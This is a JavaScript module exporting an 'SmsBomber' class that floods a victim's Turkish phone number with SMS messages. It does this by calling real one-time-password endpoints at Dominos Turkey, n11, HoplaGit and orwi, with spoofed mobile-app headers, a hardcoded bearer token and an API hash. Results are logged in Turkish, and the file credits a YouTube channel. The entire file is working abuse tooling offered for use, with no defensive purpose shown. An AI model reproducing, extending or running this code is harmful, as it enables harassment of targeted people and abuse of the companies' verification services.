            const json = {
                "gsm": "+90" + this.phone,
                "source": "orwi"
            };
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });

            if (response.status === 200) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> gandalf.orwi.app`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> gandalf.orwi.app`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> gandalf.orwi.app`);
            this.error += 1;
        }

        this.mesajiEditle();
    };

    async dominos() {
        try {
            const url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode";
            const headers = {
                "Content-Type": "application/json;charset=utf-8",
                "Accept": "application/json, text/plain, */*",
                "Authorization": "Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg",
                "Device-Info": "Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple Build-Number: 7.1.0 SystemVersion: 15.8",
                "Appversion": "IOS-7.1.0",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "tr-TR,tr;q=0.9",
                "User-Agent": "Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0",
                "Servicetype": "CarryOut",
                "Locationcode": "undefined"
            };

            const json = { "email": this.mail, "isSure": false, "mobilePhone": this.phone };
            
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(json)
            });
            
            const data = await response.json();
            
            if (data.isSuccess === true) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> frontend.dominos.com.tr`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> frontend.dominos.com.tr`);
                this.error += 1;
            }
        } catch (error) {
            this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> frontend.dominos.com.tr`);
            this.error += 1;
        }

        this.mesajiEditle();
    };

    async hoplaGit() {
        try {
            const url = 'https://api.hoplagit.com:443/v1/auth:reqSMS';
            const data1 = { phone: `+90${this.phone}` };
            const headers = {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0"
            };

            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(data1)
            });
            
            const data = await response.json();

            if (response.status === 201) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> api.hoplagit.com`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> api.hoplagit.com`);
                this.error += 1;
            }
        } catch (error) {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> api.hoplagit.com`);
                this.error += 1;
        }

        this.mesajiEditle();
    };

    async n11() {
        try {
            const url = 'https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3';
            const data1 = { "__hapc": "", "_deviceId": "696B171-031N-4131-315F-9A76BF60368F", "channel": "MOBILE_IOS", "countryCode": "+90", "email": this.mail, "gsmNumber": this.phone, "userType": "BUYER" };
            const headers = {
                "Content-Type": "application/json",
                "User-Agent": "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0",
                "Mobileclient": "IOS",
                "Accept": "*/*",
                "Authorization": "api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F",
                "Clientversion": "163",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "tr-TR,tr;q=0.9",
                "Connection": "close"
            };

            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(data1)
            });
            
            const data = await response.json();

            if (response.status === 200) {
                this.data.push(`[2;36m[+] Başarılı! ${this.phone} --> mobileapi.n11.com`);
                this.success += 1;
            } else {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> mobileapi.n11.com`);
                this.error += 1;
            }
        } catch (error) {
                this.data.push(`[2;31m[-] Başarısız! ${this.phone} --> mobileapi.n11.com`);
                this.error += 1;
        }

        this.mesajiEditle();
    };
};

module.exports =
{
    SmsBomber
};

// developed by youtube.com/@djsturkiye // Whisky Lorean